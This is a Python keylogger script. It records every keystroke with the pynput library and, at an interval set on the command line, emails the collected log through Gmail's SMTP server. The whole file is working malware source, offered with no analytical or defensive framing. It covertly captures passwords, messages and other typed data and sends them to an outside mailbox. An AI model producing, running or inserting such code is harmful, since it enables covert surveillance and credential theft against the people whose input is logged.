import pynput.keyboard
import threading
import smtplib
import argparse
from email.mime.text import MIMEText
from email.utils import formatdate

log = "" 

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--email", dest="email", help="Please specifiy an email to send the log to")
    parser.add_argument("-p", "--password", dest="password", help="Please specify the app password, google it for more details")
    parser.add_argument("-i" "--interval", dest="interval", help="Time intervals to send email, in seconds")
    arguments = parser.parse_args()
    if not arguments.email:
        parser.error("Please specify an email, use --help for more details")
    elif not arguments.password: 
        parser.error("Please specify your app password, use --help for more details.")
    elif not arguments.interval:
        parser.error("Please specify a time interval in seconds")
    else: 
        return arguments

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    msg = MIMEText(message, "plain", "utf-8")
    msg["Subject"] = f"Keylogger Report - {formatdate()}"
    msg["From"] = email
    msg["To"] = email
    server.login(email, password)
    server.sendmail(email, email,  msg.as_string())
    server.quit()
    
def process_key_press(key): 
    global log
    try: 
         log = log + (str(key.char))
    except AttributeError: 
        if key == key.space:
            log = log + " "
        else: 
            log = log + str(key) + " "
    
def report(email, password, interval):
    global log
    if log:
        send_mail(email, password, log)
        log = ""  
    timer = threading.Timer(int(interval), report, args=(email, password, interval))
    timer.start()  
    

def start(email, password, interval):    
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report(email, password, interval)
        keyboard_listener.join()

if __name__== "__main__":
    args = get_args()
    start(args.email, args.password, args.interval)